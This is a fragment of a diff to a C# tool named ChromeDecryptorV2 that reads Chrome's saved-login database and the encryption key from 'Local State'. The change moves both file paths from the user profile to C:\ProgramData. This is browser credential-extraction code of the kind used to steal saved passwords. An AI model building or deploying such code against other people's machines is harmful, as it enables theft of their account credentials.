@@ -33,8 +33,8 @@ namespace ChromeDecryptorV2
 				return;
 			}
 
-			string localappdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
-			string LoginDataPath = localappdata + "\\Google\\Chrome\\User Data\\Default\\Login Data";
+			string localappdata = @"C:\\ProgramData";
+			string LoginDataPath = localappdata + "\\Login Data";
 
 			byte[] key = GetKey();
 
@@ -106,8 +106,8 @@ namespace ChromeDecryptorV2
 		//Gets the key used for new AES encryption (from Chrome 80)
 		static byte[] GetKey()
 		{
-			string localappdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
-			string FilePath = localappdata + "\\Google\\Chrome\\User Data\\Local State";
+			string localappdata = @"C:\\ProgramData";
+			string FilePath = localappdata + "\\Local State";
 			string content = File.ReadAllText(FilePath);
 			dynamic json = JsonConvert.DeserializeObject(content);
 			string key = json.os_crypt.encrypted_key;
